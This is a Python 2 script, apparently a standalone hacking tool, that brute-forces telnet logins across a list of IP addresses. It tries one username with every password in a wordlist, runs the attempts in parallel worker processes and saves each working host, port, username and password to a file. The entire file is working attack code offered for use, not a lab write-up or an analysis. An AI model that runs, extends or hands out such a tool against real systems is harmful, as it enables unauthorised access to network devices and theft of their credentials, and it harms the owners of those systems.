# -*- coding:utf-8 -*-
#__author__:langzi
#__blog__:www.langzi.fun
import re
import telnetlib
import time
import multiprocessing
import ConfigParser

timeout=8

def success(x):
    with open('success.txt', 'a+')as a:
        a.write(x + "\n")

def brute_telnet(ip,username,passwords,port):
    for password in passwords:
        print 'Checking>>>TELNET:' + ip + '@' + username + ':' + password + ':'  + str(port)
        try:
            tn = telnetlib.Telnet(ip,timeout=timeout)
            tn.set_debuglevel(5)
            time.sleep(0.5)
            oss = tn.read_some()
            user_match = "(?i)(login|user|username)"
            pass_match = '(?i)(password|pass)'
            login_match = '#|\$|>'
            if re.search(user_match, oss):
                try:
                    tn.write(username + '\r\n')
                    tn.read_until(pass_match, timeout=2)
                    tn.write(password + '\r\n')
                    login_info = tn.read_until(login_match, timeout=3)
                    tn.close()
                    if re.search(login_match, login_info):
                        success('TELNET:'+ip + ':' + str(port) + '|' + username + ':' + password)
                        return 'TELNET'
                except Exception, e:
                    print e
                    pass
            else:
                try:
                    info = tn.read_until(user_match, timeout=2)
                except Exception, e:
                    print e
                    pass
                if re.search(user_match, info):
                    try:
                        tn.write(username + '\r\n')
                        tn.read_until(pass_match, timeout=2)
                        tn.write(password + '\r\n')
                        login_info = tn.read_until(login_match, timeout=3)
                        tn.close()
                        if re.search(login_match, login_info):
                            success('TELNET:'+ip + ':' + str(port) + '|' + username + ':' + password)
                            return 'TELNET'
                    except Exception, e:
                        print e
                        pass
                elif re.search(pass_match, info):
                    tn.read_until(pass_match, timeout=2)
                    tn.write(password + '\r\n')
                    login_info = tn.read_until(login_match, timeout=3)
                    tn.close()
                    if re.search(login_match, login_info):
                        success('TELNET:'+ip + ':' + str(port) + '|' + username + ':' + password)
                        return 'TELNET'
        except Exception ,e:
            #print e
            pass

if __name__ == '__main__':
    multiprocessing.freeze_support()

    cfg = ConfigParser.ConfigParser()
    cfg.read('Config.ini')
    user = cfg.get("Config", "user")
    thread_s = int(cfg.get("Config", "threads"))
    port = int(cfg.get("Config", "port"))
    print '\n\n     TELNET SCAN'
    print '         USER:' + user
    print '         PORT:' + str(port)
    print '         THREADS:' + str(thread_s)

    New_start = raw_input('INPUT IP LIST TXT:')  # line:190
    New_start = New_start.replace('"', '').replace("'", '')
    IP_list = list(set([x.strip() for x in open(New_start,'r').readlines()]))

    Password_list_ = list(set([x.strip() for x in open('password.txt','r').readlines()]))

    p = multiprocessing.Pool(thread_s)

    for ip in IP_list:
        p.apply_async(brute_telnet, args=(ip,user,Password_list_,port))
    p.close()
    p.join()
